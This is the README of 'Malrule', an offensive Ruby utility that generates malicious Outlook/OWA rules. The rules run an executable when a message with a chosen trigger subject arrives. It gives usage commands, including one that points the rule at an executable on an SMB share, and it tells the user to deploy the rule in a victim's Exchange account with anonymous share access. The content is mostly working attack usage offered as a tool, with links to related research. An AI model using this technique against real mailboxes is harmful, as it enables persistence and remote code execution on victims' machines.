# Malrule

Quick and painless utility to generate malicious OWA rules.

# Useful Resources

The following resources discuss how this attack works in detail. Authors for each resource have written their own utilities as well. Sensepost's resource, _ruler_, takes the attack further by using MAPI requests to automagically deploy the rule using user provided credentials.

- [SilentBreak Security: Malicious Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/)
- [Sensepost: MAPI over HTTP and Mailrule Pwnage](https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/)

# Malrule Usage

## Getting Help

    user@dathost:malrule~> ruby malrule.rb help generate
    Usage:
      malrule.rb generate --executable-path=EXECUTABLE_PATH --file-name=FILE_NAME --rule-name=RULE_NAME --subject-trigger=SUBJECT_TRIGGER

    Options:
      --rule-name=RULE_NAME              # Name for the rule, as it will will appear in Outlook and OWA.
      --subject-trigger=SUBJECT_TRIGGER  # String appearing in the subject line that triggers execution of the rule1.
      --executable-path=EXECUTABLE_PATH  # Path to the executable file.
      --file-name=FILE_NAME              # Name of the file that the rule will be written to.

    Generate a malicious outlook rule. The rule should be deployed in the victim's Exchange account via OWA or Outlook and is then synchronized via Outlook so long as the victim's account is logged in.

## Generating a Rule

    user@dathost:malrule~> ruby malrule.rb generate --executable-path='\\127.0.0.1\share\file.exe' --subject-trigger="innocuous subject" --rule-name="OOO" --file-name="myrule"

    [+]  Rule file written to myrule.rwz...exiting

## Generate a Test Rule

Deploy the rule in an exchange account under your control and send yourself an email with the subject "innocuous subject" to pop cmd.exe. This is just to illustrate that the rule is working locally. Enhance the test by deploying an executable on an SMB share and updating the executable path to point to that file. __Note:__ make sure permissions allow for anonymous access to the share and file.

    user@dathost:malrule~> ruby malrule.rb generate --executable-path='cmd.exe' --subject-trigger="innocuous subject" --rule-name="OOO" --file-name="myrule"

    [+]  Rule file written to myrule.rwz...exiting